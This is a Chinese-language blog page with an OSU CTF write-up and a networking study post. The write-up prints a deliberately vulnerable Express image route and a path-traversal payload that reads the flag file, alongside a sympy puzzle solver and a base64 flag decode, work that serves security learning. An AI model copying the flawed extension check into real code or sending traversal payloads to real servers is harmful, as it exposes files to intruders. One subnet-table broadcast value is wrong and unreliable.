    <article id="osu-osu_ctf" class="article article-type-osu" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/osu_ctf/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/osu_ctf/">
        OSU CTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>內容會慢慢更新…筆記整理中</p>
<h3 id="Web-mikufanpage"><a href="#Web-mikufanpage" class="headerlink" title="Web/mikufanpage"></a>Web/mikufanpage</h3><p>url: <a target="_blank" rel="noopener" href="https://mikufanpage.web.osugaming.lol/">https://mikufanpage.web.osugaming.lol/</a></p>
<p>這題在察看網頁後，看不出什麼，題目沒有提供太多有用訊息，但有給個網頁的建置檔案<br><img src="img/osu2.png" alt="osu"></p>
<p>所以在查看網頁原始碼後會注意到 <code>app.js</code> 的內容寫到，僅限制讀取 <code>img</code> 目錄下的 <code>.png</code> 及 <code>.jpg</code><br>意味者須要想個辦法去繞過這限制</p>
<p>題外話，如果想把當前他給的網頁原始碼的檔案建立起來</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm init</span><br><span class="line">Command &#x27;npm&#x27; not found, but can be installed with:</span><br><span class="line">apt install npm</span><br><span class="line">Do you want to install it? (N/y)y</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm install express --save</span><br><span class="line"></span><br><span class="line">added 64 packages, and audited 65 packages in 2s</span><br><span class="line"></span><br><span class="line">12 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# node app.js               </span><br><span class="line">mikufanpage running on port 3000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> ?? <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">(<span class="params">err</span>) =&gt;</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!err) </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mikufanpage running on port &quot;</span>+ <span class="variable constant_">PORT</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Err &quot;</span>, err); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/image&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>) &#123; <span class="comment">// only allow images</span></span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./img/&#x27;</span> + req.<span class="property">query</span>.<span class="property">path</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我們可以透過網頁也就是 <code>index.html</code> 內容中有寫到目前在輪流播放的圖片存取位置<br><img src="img/osu3.png" alt="osu"></p>
<p><code>/image?path=</code> 是個不錯的利用點，讓我想到應該可以利用LFI漏洞將flag.txt噴出來<br>之所以知道flag.txt是在img目錄下是因為題目提供的網頁原始檔中他們放在img目錄下</p>
<p><img src="img/osu4.png" alt="osu"></p>
<p>開啟burp攔截封包並對url進行測試，其實在測了幾個後發現，常見的做法可能是</p>
<ul>
<li>flag.txt.png</li>
<li>flag.txt%00</li>
</ul>
<p>但這些行不通，路徑中必須包含已經存在的png位置，摸索一番後…</p>
<ul>
<li>miku1.jpg../../../img/flag.txt</li>
</ul>
<p><img src="img/osu1.png" alt="osu"></p>
<ul>
<li>osu{miku_miku_miku_miku_miku_miku_miku_miku_….}</li>
</ul>
<hr>
<h3 id="Reverse-SAT-before-osu"><a href="#Reverse-SAT-before-osu" class="headerlink" title="Reverse/SAT-before-osu"></a>Reverse/SAT-before-osu</h3><p>題目給了一個檔案需要解開他的謎題</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b + c + w = 314</span><br><span class="line"></span><br><span class="line">t + d + u = 290</span><br><span class="line"></span><br><span class="line">p + w + e = 251</span><br><span class="line"></span><br><span class="line">v + l + j = 274</span><br><span class="line"></span><br><span class="line">a + t + b = 344</span><br><span class="line"></span><br><span class="line">b + j + m = 255</span><br><span class="line"></span><br><span class="line">h + o + u = 253</span><br><span class="line"></span><br><span class="line">q + l + o = 316</span><br><span class="line"></span><br><span class="line">a + g + j = 252</span><br><span class="line"></span><br><span class="line">q + x + q = 315</span><br><span class="line"></span><br><span class="line">t + n + m = 302</span><br><span class="line"></span><br><span class="line">d + b + g = 328</span><br><span class="line"></span><br><span class="line">e + o + m = 246</span><br><span class="line"></span><br><span class="line">v + v + u = 271</span><br><span class="line"></span><br><span class="line">f + o + q = 318</span><br><span class="line"></span><br><span class="line">s + o + j = 212</span><br><span class="line"></span><br><span class="line">j + j + n = 197</span><br><span class="line"></span><br><span class="line">s + u + l = 213</span><br><span class="line"></span><br><span class="line">q + w + j = 228</span><br><span class="line"></span><br><span class="line">i + d + r = 350</span><br><span class="line"></span><br><span class="line">e + k + u = 177</span><br><span class="line"></span><br><span class="line">w + n + a = 288</span><br><span class="line"></span><br><span class="line">r + e + u = 212</span><br><span class="line"></span><br><span class="line">q + l + f = 321</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>似乎每個方程式都代表字母表中三個字母的總和。我們可以解這些方程式來找出每個字母的數值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line">a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z = symbols(</span><br><span class="line">    <span class="string">&#x27;a b c d e f g h i j k l m n o p q r s t u v w x y z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定義了26個變數，每個變數代表英文字母a到z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定義一個包含多個方程的方程組，每個方程都是形如&quot;字母1 + 字母2 + 字母3 = 數值&quot;的形式。</span></span><br><span class="line">equations = [</span><br><span class="line">    Eq(b + c + w, <span class="number">314</span>),</span><br><span class="line">    Eq(t + d + u, <span class="number">290</span>),</span><br><span class="line">    Eq(p + w + e, <span class="number">251</span>),</span><br><span class="line">    Eq(v + l + j, <span class="number">274</span>),</span><br><span class="line">    Eq(a + t + b, <span class="number">344</span>),</span><br><span class="line">    Eq(b + j + m, <span class="number">255</span>),</span><br><span class="line">    Eq(h + o + u, <span class="number">253</span>),</span><br><span class="line">    Eq(q + l + o, <span class="number">316</span>),</span><br><span class="line">    Eq(a + g + j, <span class="number">252</span>),</span><br><span class="line">    Eq(q + x + q, <span class="number">315</span>),</span><br><span class="line">    Eq(t + n + m, <span class="number">302</span>),</span><br><span class="line">    Eq(d + b + g, <span class="number">328</span>),</span><br><span class="line">    Eq(e + o + m, <span class="number">246</span>),</span><br><span class="line">    Eq(v + v + u, <span class="number">271</span>),</span><br><span class="line">    Eq(f + o + q, <span class="number">318</span>),</span><br><span class="line">    Eq(s + o + j, <span class="number">212</span>),</span><br><span class="line">    Eq(j + j + n, <span class="number">197</span>),</span><br><span class="line">    Eq(s + u + l, <span class="number">213</span>),</span><br><span class="line">    Eq(q + w + j, <span class="number">228</span>),</span><br><span class="line">    Eq(i + d + r, <span class="number">350</span>),</span><br><span class="line">    Eq(e + k + u, <span class="number">177</span>),</span><br><span class="line">    Eq(w + n + a, <span class="number">288</span>),</span><br><span class="line">    Eq(r + e + u, <span class="number">212</span>),</span><br><span class="line">    Eq(q + l + f, <span class="number">321</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用solve函數來解這個方程組，找到符合所有方程式的字母對應數值</span></span><br><span class="line"><span class="comment"># solve(equations, variables)</span></span><br><span class="line">solution = solve(equations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將字母對應的數值轉換為ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> letter, value <span class="keyword">in</span> solution.items():</span><br><span class="line">    <span class="built_in">print</span>(letter, <span class="built_in">chr</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>輸出</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a o</span><br><span class="line">b s</span><br><span class="line">c u</span><br><span class="line">d &#123;</span><br><span class="line">e 0</span><br><span class="line">f r</span><br><span class="line">g Z</span><br><span class="line">h _</span><br><span class="line">i p</span><br><span class="line">j 3</span><br><span class="line">k P</span><br><span class="line">l p</span><br><span class="line">m Y</span><br><span class="line">n _</span><br><span class="line">o m</span><br><span class="line">p y</span><br><span class="line">q _</span><br><span class="line">r s</span><br><span class="line">s 4</span><br><span class="line">t v</span><br><span class="line">u 1</span><br><span class="line">v o</span><br><span class="line">w R</span><br><span class="line">x &#125;</span><br></pre></td></tr></table></figure>
<p>補充</p>
<ul>
<li>equations 是一個包含了26個方程式的列表，每個方程式表示三個字母的數字和等於一個特定的值。 </li>
<li>variables 則是由我們定義的26個字母變數所組成的清單。</li>
<li>透過呼叫 solve(equations)，嘗試求解方程組，並找到每個字母對應的數字值。</li>
</ul>
<hr>
<h3 id="Web-when-you-dont-see-it"><a href="#Web-when-you-dont-see-it" class="headerlink" title="Web/when-you-dont-see-it"></a>Web/when-you-dont-see-it</h3><p>題目說在他的profile中有藏flag<br><a target="_blank" rel="noopener" href="https://osu.ppy.sh/users/11118671">https://osu.ppy.sh/users/11118671</a></p>
<p>找了一下，在 F12 &gt; Sources &gt; users &gt; 11118671<br>全域搜尋下找到了flag<br><img src="img/osu6.png" alt="osu"></p>
<p>然後拿去 base64 decode<br><img src="img/osu5.png" alt="osu"></p>
<ul>
<li>osu{ok_u_see_me}</li>
</ul>
<hr>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Networking" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Networking/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.088Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Networking/">
        Networking
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Networking-Refresher"><a href="#Networking-Refresher" class="headerlink" title="Networking Refresher"></a>Networking Refresher</h1><hr>
<h2 id="IP-Addresses"><a href="#IP-Addresses" class="headerlink" title="IP Addresses"></a>IP Addresses</h2><ul>
<li><p>linux</p>
<ul>
<li>ifconfig</li>
<li><p>decimal notation</p>
<ul>
<li>A bunch of ones and zeros that are put together</li>
<li>eight bits</li>
<li>32bits</li>
<li><p>11111111.11111111.11111111.11111111 ⇒ 255.255.255.255</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">128 64 32 16 8 4 2 1</span><br><span class="line"> 1   1  1  1 1 1 1 1 =&gt; 255</span><br><span class="line"> 0   0  0  1 1 1 1 1 =&gt; 31</span><br><span class="line"> 1   1  0  0 1 0 1 0 =&gt; 202</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>IPV4 ⇒ 2^32 → 4294967296 可以擁有的IP位址全部數量</p>
</li>
<li>IPV6 ⇒ 128bits hexadecimal<ul>
<li>2^128 → 3.4028236692093846346337460743177e+38 可以擁有的IP位址全部數量</li>
<li>IPv6 位址分為八組，每組四個十六進位數字，以冒號分隔。組內的前導零可以省略，連續的零組可以用雙冒號 (::) 表示，以簡化位址</li>
</ul>
</li>
</ul>
</li>
<li><p>Network address translation → 分配位址</p>
<ul>
<li><p>Private IP Address</p>
<p><img src="img/Net_Untitled.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>OSI &gt; 3 layer → router</p>
<ul>
<li>透過IP 位址進行路由</li>
</ul>
</li>
<li>windows<ul>
<li>ipconfig</li>
</ul>
</li>
</ul>
<h2 id="MAC-Addresses"><a href="#MAC-Addresses" class="headerlink" title="MAC Addresses"></a>MAC Addresses</h2><ul>
<li>MAC（媒體存取控制）</li>
<li>指派給網路設備的網路介面控制器（NIC）的唯一識別碼</li>
<li>用於 OSI 模型的資料鏈結層，以確保資料傳送到本地網路內的正確設備</li>
<li>MAC 位址的長度通常為 48 位</li>
<li>由冒號或連字號分隔的六對十六進位數字的序列</li>
<li>使用mac address lookup輸入IPV6前三對數位識別查看相關資訊<ul>
<li><a target="_blank" rel="noopener" href="https://aruljohn.com/mac.pl">https://aruljohn.com/mac.pl</a></li>
<li>可以利用前三對數位識別網路介面卡，找出設備</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:1A:2B:3C:4D:5E</span><br><span class="line">00:1A:2B -&gt; 前三對數位識別網路介面卡的製造商</span><br><span class="line">3C:4D:5E -&gt; 後三對數字提供特定設備的唯一識別碼</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>允許裝置在區域網路 (LAN) 內相互通訊</strong></li>
<li>當資料從同一網路上的一台裝置傳送到另一台裝置時，資料會封裝在包含來源 MAC 位址和目標 MAC 位址的乙太網路訊框中</li>
<li>路由器和交換器使用這些 MAC 位址將資料轉送到適當的目的地</li>
<li>MAC 位址特定於本機網絡，並不像 IP 位址那樣具有全域唯一性，僅在本地網段範圍內相關</li>
<li>資料需要傳輸到本機網路以外時，它會被封裝在包含來源IP位址和目標IP位址的網路封包中</li>
<li>基於硬體、特定於製造商的，與用於更大規模網路通訊的 IP 位址不同</li>
</ul>
<h2 id="TCP-UDP-and-the-Three-Way-Handshake"><a href="#TCP-UDP-and-the-Three-Way-Handshake" class="headerlink" title="TCP, UDP, and the Three-Way Handshake"></a>TCP, UDP, and the Three-Way Handshake</h2><ul>
<li>layer 4 → transport layer</li>
<li>TCP（Transmission Control Protocol (Connection Oriented Protocol)）和UDP（User Datagram Protocol (Connectionless Protocol)）是電腦網路中兩種常用的傳輸層協定</li>
<li><p>TCP 是一種連線導向的協議</p>
<ul>
<li>可透過 IP 網路提供可靠、有序且經過錯誤檢查的封包傳輸</li>
<li><strong>它保證從一台設備發送的資料被目標設備正確接收</strong></li>
<li>透過確認、重傳和流量控制等機制來實現這種可靠性</li>
<li>資料分成更小的資料包，為其分配序號，並確保它們在接收端正確重組</li>
<li>用於需要保證傳輸的應用程序，例如網頁瀏覽、電子郵件、文件傳輸和遠端登入。</li>
<li>HTTP</li>
<li><p>Three-Way Handshake 是 TCP 用來在兩個設備之間建立連線的過程</p>
<ul>
<li>資料傳輸開始之前發生的一系列三個步驟</li>
<li>SYN（同步）&gt; SYN-ACK（同步確認）&gt; ACK（確認）</li>
<li>SYN<ul>
<li>發起設備（通常稱為客戶端）將帶有 SYN 標誌的 TCP 封包傳送到目標設備（通常稱為伺服器）</li>
<li>資料包表示建立連接的願望並包括初始序號</li>
</ul>
</li>
<li>SYN-ACK<ul>
<li>接收到 SYN 封包後，目標裝置會使用同時設定了 SYN 和 ACK（確認）標誌的 TCP 封包進行回應</li>
<li>資料包確認初始 SYN 資料包的接收，並且還包含其自己的初始序號</li>
</ul>
</li>
<li>ACK<ul>
<li>發起裝置透過將 ACK 封包傳送回目的地來確認 SYN-ACK 封包</li>
<li>資料包確認連線的建立，並且通常包含遞增的序號</li>
</ul>
</li>
<li>三向握手完成，連線就建立了，兩個設備就準備好交換資料了</li>
<li><p>握手期間交換的序號用於確保資料以正確的順序發送和接收</p>
<p><img src="img/Net_Untitled1.png" alt="Untitled1"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>UDP 是一種無連線協議</p>
<ul>
<li>無法提供與 TCP 相同等級的可靠性</li>
<li>更簡單、更輕量，使其適合能夠容忍某些資料遺失或延遲的應用程式</li>
<li><strong>UDP 不建立連線或保證資料包的傳送</strong></li>
<li>將資料包從一個設備發送到另一台設備，而無需等待確認或重傳</li>
<li>用於串流媒體、線上遊戲、DNS（網域名稱系統）和 VoIP（IP 語音）等即時應用程式</li>
<li>DNS</li>
</ul>
</li>
</ul>
<h2 id="Common-Ports-and-Protocols"><a href="#Common-Ports-and-Protocols" class="headerlink" title="Common Ports and Protocols"></a>Common Ports and Protocols</h2><ul>
<li>某些協定同時使用 TCP 和 UDP，具體取決於特定功能和要求。</li>
<li>連接埠分配並不詳盡，其他應用程式和服務也可能使用不同的連接埠</li>
<li>TCP<ul>
<li>FTP(21) → File Transfer Protocol &gt;放置文件、取得文件</li>
<li>SSH(22) → Secure Shell &gt; 遠端登入 &gt; 加密轉換</li>
<li>Telnet(23) &gt; 明文 &gt; 遠端登入</li>
<li>SMTP(25) → Simple Mail Transfer Protocol &gt; 郵件</li>
<li>DNS(53) → Domain Name System &gt;TCP and UDP</li>
<li>HTTP(80) → Hypertext Transfer Protocol &gt; 不安全網站</li>
<li>HTTPS(443) →  Hypertext Transfer Protocol Secure &gt; 加密網站</li>
<li>P0P3(110) → Post Office Protocol version 3</li>
<li>SMB(139 + 445) → Server Message Block &gt; 文件共享相關 &gt; Wanna Cry virus &gt;永恆之藍</li>
<li>IMAP(143) → Internet Message Access Protocol</li>
<li>RDP(3389) → Remote Desktop Protocol</li>
<li>FTPS(990) → FTP over SSL/TLS</li>
<li>LDAP(389) → Lightweight Directory Access Protocol &gt;TCP and UDP</li>
<li>MySQL(3306)</li>
<li>RDP(3389) → Remote Desktop Protocol</li>
</ul>
</li>
<li>UDP<ul>
<li>DNS(53) &gt; IP 位址解析</li>
<li>DHCP(67,68) → Dynamic Host Configuration Protocol &gt; 隨機關聯一個IP位址</li>
<li>TFTP(69) → Trivial File Transfer Protocol</li>
<li>SNMP(161) → Simple Network Management Protocol</li>
<li>NTP(123) → Network Time Protocol</li>
</ul>
</li>
</ul>
<h2 id="The-OSI-Model"><a href="#The-OSI-Model" class="headerlink" title="The OSI Model"></a>The OSI Model</h2><ul>
<li>OSI (Open Systems Interconnection) model 是一個概念框架</li>
<li>通訊系統的功能標準化為七個不同的層</li>
<li>每個層都有特定的職責，並與其上層和下層互動</li>
<li>pls do not throw sausage pizza away → PDNTSPA</li>
<li>Physical Layer<ul>
<li>透過實體媒體傳輸和接收原始非結構化資料位元</li>
<li>定義了設備之間實體介面的電氣、機械和功能特性</li>
<li>data cables, cat6</li>
</ul>
</li>
<li>Data Link Layer<ul>
<li>透過實體鏈路直接連接的節點之間資料幀的可靠傳輸</li>
<li>提供錯誤檢測和糾正、流量控制，並處理對物理介質的存取</li>
<li>乙太網路、Wi-Fi 和 PPP（點對點協定）</li>
<li>Switching, MAC address</li>
</ul>
</li>
<li>Network Layer<ul>
<li>支援封包跨不同網路的路由</li>
<li>處理邏輯尋址並根據網路條件和路由協定確定資料傳輸的最佳路徑</li>
<li>IP（Internet Protocol）是關鍵的網路層協定</li>
<li>IP address, routing</li>
</ul>
</li>
<li>Transport Layer<ul>
<li>確保端系統之間資料的可靠、有序傳送</li>
<li>資料分成更小的段，管理端對端通信，並提供錯誤恢復、流量控制和擁塞控制</li>
<li>TCP（傳輸控制協定）和UDP（用戶資料報協定）</li>
</ul>
</li>
<li>Session Layer<ul>
<li>建立、管理和終止應用程式之間的通訊會話</li>
<li>提供同步和對話控制機制，以實現設備之間的無縫通訊</li>
<li>處理會話檢查點和恢復</li>
<li>session management</li>
</ul>
</li>
<li>Presentation Layer<ul>
<li>負責資料表示、加密、壓縮和格式化</li>
<li>確保一個系統的應用層所發送的資料可以被另一個系統的應用層理解</li>
<li>處理資料語法和語義</li>
<li>WMV, JPEG, MOV</li>
</ul>
</li>
<li>Application Layer<ul>
<li>距離最終用戶最近的一層</li>
<li>為用戶應用程式提供服務</li>
<li>用於各種應用程式級服務的協議</li>
<li>例如文件傳輸、電子郵件、網頁瀏覽和遠端存取</li>
<li>HTTP、SMTP、FTP 和 DNS</li>
</ul>
</li>
<li>將複雜的網路通訊任務分成可管理的層，每個層專注於特定的功能</li>
<li>這種模組化方法有利於網路系統的互通性、易於實施和故障排除</li>
<li>不一定反映所有網路系統的確切實現，這些系統通常使用各種層和協定的混合</li>
</ul>
<h2 id="Subnetting"><a href="#Subnetting" class="headerlink" title="Subnetting"></a>Subnetting</h2><p>七秒子網劃分：  <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ZxAwQB8TZsM">https://www.youtube.com/watch?v =ZxAwQB8TZsM</a></p>
<p>子網路指南：  <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view">https ://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view</a></p>
<p><img src="img/Net_Untitled2.png" alt="Untitled2"></p>
<ul>
<li>網路劃分為更小的子網路（稱為子網路）的過程</li>
<li>有效地使用 IP 位址並促進網路管理和路由。子網路劃分通常用於 IPv4 網路</li>
<li>涉及從 IP 位址的主機部分借用位元來建立子網路識別碼<ul>
<li>網路可以分為多個子網，每個子網路都有自己的 IP 位址範圍</li>
</ul>
</li>
<li>CIDR（無類別域間路由）表示法是一種用來表示 IP 位址及其對應子網路遮罩的方法</li>
<li>指定網路前綴長度，表示用於 IP 位址網路部分的位數</li>
<li>透過在 IP 位址後附加正斜線 (/) 後接前綴長度來表示</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exampl1</span><br><span class="line">128 64 32 16 8 4 2 1  ||   128 64 32 16 8 4 2 1  ||  128 64 32 16 8 4 2 1 ||  128 64 32 16 8 4 2 1  </span><br><span class="line"> 1   1  1  1 1 1 1 1        1   1  1  1 1 1 1 1       1   1  1  1 1 1 1 1      0   0  0  0 0 0 0 0</span><br><span class="line">------------------------------------------------------------------------------------------------------------         </span><br><span class="line">         |||                       |||                        |||                     |||</span><br><span class="line">          8           +             8            +             8           +           0       =&gt;   /24</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">         255                       255                        255                      0         Hosts -&gt; 2^8 -&gt; 256</span><br><span class="line"></span><br><span class="line">============================================================================================================</span><br><span class="line"></span><br><span class="line">example2</span><br><span class="line">128 64 32 16 8 4 2 1  ||   128 64 32 16 8 4 2 1  ||  128 64 32 16 8 4 2 1 ||  128 64 32 16 8 4 2 1  </span><br><span class="line"> 1   1  1  1 1 1 1 1        1   1  1  1 1 1 1 1       1   1  1  1 1 1 1 1      1   1  0  0 0 0 0 0</span><br><span class="line">------------------------------------------------------------------------------------------------------------         </span><br><span class="line">         |||                       |||                        |||                     |||</span><br><span class="line">          8           +             8            +             8           +           2       =&gt;   /26</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">         255                       255                        255                     192        Hosts -&gt; 2^6 -&gt; 64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1    2    3    4    5    6    7    8   ||  255.0.0.0</span><br><span class="line"> 9   10   11   12   13   14   15   16   ||  255.255.0.0</span><br><span class="line">17   18   19   20   21   22   23   24   ||  255.255.255.0</span><br><span class="line">25   26   27   28   29   30   31   32   ||  </span><br><span class="line"></span><br><span class="line">Hosts     128   64   32   16    8    4    2    1</span><br><span class="line">Subnet    128  192  224  240  248  252  254  255</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  CIDR range           Subnet       Hosts      Network        Broadcast</span><br><span class="line">192.168.1.0/24      255.255.255.0     254     192.168.1.0    192.168.1.255</span><br><span class="line">192.168.1.0/28      255.255.255.240    14     192.168.1.0    192.168.1.15 </span><br><span class="line">192.168.1.16/28     255.255.255.240    14     192.168.1.16   192.168.1.31 </span><br><span class="line">192.168.0.0/23      255.255.254.0     510     192.168.0.0    192.168.1.255 </span><br><span class="line">192.168.2.0/23      255.255.254.0     510     192.168.2.0    192.168.3.255</span><br><span class="line">192.168.1.0/23      255.255.254.0     510     192.168.0.0    192.168.1.255</span><br><span class="line">192.168.0.0/22      255.255.252.0    1022     192.168.0.0    192.168.3.255</span><br><span class="line">192.168.1.0/26      255.255.255.192    62     192.168.1.0    192.168.0.63</span><br><span class="line">192.168.1.0/27      255.255.255.224    30     192.168.1.0    192.168.1.31</span><br><span class="line">======</span><br><span class="line">192.168.0.0/22 -&gt; 11111111.11111111.11111100.00000000</span><br><span class="line">										8         8        6              =&gt;22</span><br><span class="line"></span><br><span class="line">                **32 - 22 = 10** -&gt; 2^ 10 -&gt; 1024 -2</span><br><span class="line"></span><br><span class="line">192.168.0.0 -&gt; 11000000.10101000.00000000.00000000</span><br><span class="line"> =&gt;                 192.     168.     3.       255</span><br><span class="line">                 11000000.10101000.000000**11.11111111。**</span><br><span class="line"></span><br><span class="line">192.168.1.0/27-&gt; 11000000.10101000.00000001.00000000</span><br><span class="line">  **32 - 27 = 5 -&gt; 2^5** -&gt; 32 -2 </span><br><span class="line">-&gt; 11111111.11111111.11111111.11100000</span><br><span class="line">      255      255      255    224</span><br><span class="line"></span><br><span class="line">11000000.10101000.00000001.00000000</span><br><span class="line">11000000.10101000.00000001.00011111 =&gt; 192.168.1.31</span><br><span class="line"></span><br><span class="line">==========</span><br><span class="line"></span><br><span class="line">Hosts -&gt; 14 </span><br><span class="line">Subnet -&gt; 255.255.255.240 -&gt; /28 -&gt; 255.255.255.x</span><br><span class="line">            8  8   8  128+64+32+16</span><br><span class="line">											15 - 1 = 14 -&gt; Hosts</span><br><span class="line"></span><br><span class="line">Hosts -&gt; 510</span><br><span class="line">Subnet -&gt; 255.255.254.0 -&gt; /23 -&gt; 255.255.x.0</span><br><span class="line">                  1 + 8 -&gt; 9</span><br><span class="line">									 2^9 -&gt; hosts -&gt; 512</span><br><span class="line">									512-2 = 510 (兩位址用於廣播地址及網路地址)</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
